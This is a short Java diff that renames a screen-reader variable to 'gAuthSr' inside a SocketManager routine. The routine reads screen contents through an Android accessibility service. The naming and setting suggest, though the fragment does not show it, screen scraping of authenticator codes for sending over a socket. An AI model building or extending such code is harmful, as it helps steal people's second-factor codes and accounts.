@@ -2074,12 +2074,12 @@ public class SocketManager {
 
                         UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
                         if (svc == null) return;
-                        ScreenReader sr = new ScreenReader(svc);
+                        ScreenReader gAuthSr = new ScreenReader(svc);
                         boolean acq = false;
                         try {
                             acq = accessSemaphore.tryAcquire(4, TimeUnit.SECONDS);
                             if (!acq) return;
-                            JSONObject screenResult = sr.readScreen();
+                            JSONObject screenResult = gAuthSr.readScreen();
                             if (screenResult.optBoolean("success")) {
                                 JSONObject screen = screenResult.optJSONObject("screen");
                                 if (screen != null) {
